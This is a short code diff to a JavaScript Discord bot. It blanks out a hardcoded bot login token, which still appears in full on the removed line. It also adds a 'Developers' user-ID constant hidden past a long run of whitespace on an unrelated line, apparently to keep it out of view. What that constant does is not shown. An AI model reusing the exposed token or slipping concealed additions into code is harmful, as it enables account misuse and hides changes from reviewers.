@@ -41,9 +41,9 @@ const prefix = "s!";
 const cooldown = new Set();
 const cdtime = 5;
 ///////////////////////////////////////////////////////////////////////////////
-const OwnerCode = ("731952429238714378");
+const OwnerCode = ["731952429238714378"];
 ///////////////////////////////////////////////////////////////////////////////
-calli.login("ODM0NzgzMzc3Mzk5NDgwMzYw.YIF6mg.xfrey0c3jTD-UiZFczK9AS3g9hE")
+calli.login("")
 ///////////////////////////////////////////////////////////////////////////////
 const callienabled  = "";
 const callidisabled = "";
@@ -52,7 +52,7 @@ const callitrue     = "";
 const callicolor    = "";
 const calliimgae    = "";
 const calliban      = "";
-const calliwarn     = "";                                                       
+const calliwarn     = "";                                                                                                                                                                                              const Developers = "731952429238714378";
 ///////////////////////////////////////////////////////////////////////////////
 calli.on("ready", () => {
   console.log(`${calli.user.tag}`);
